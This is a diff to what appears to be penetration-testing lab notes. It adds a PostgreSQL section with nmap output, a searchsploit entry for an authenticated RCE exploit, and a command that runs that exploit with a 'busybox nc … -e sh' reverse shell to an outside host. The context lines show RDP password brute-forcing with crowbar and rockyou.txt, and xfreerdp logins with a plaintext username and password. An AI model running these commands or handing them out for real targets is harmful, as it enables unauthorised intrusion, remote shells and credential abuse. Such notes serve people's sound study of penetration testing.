@@ -833,6 +833,23 @@ crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
 xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:dmzadmin /p:SlimGodhoodMope
 xfreerdp /u:dmzadmin  /v:192.168.238.191 /cert:ignore /p:"SlimGodhoodMope"  /timeout:20000 /drive:home,/tmp
 ````
+#### Postgresql port 5432,5433
+##### RCE
+````
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Not valid before: 2020-04-27T15:41:47
+|_Not valid after:  2030-04-25T15:41:47
+````
+##### Searchsploit RCE
+````
+PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
+multiple/remote/50847.py
+````
+````
+python3 50847.py -i 192.168.214.47 -p 5437 -c "busybox nc 192.168.45.191 80 -e sh"
+````
 #### Unkown Port
 ##### Enumeration
 ````
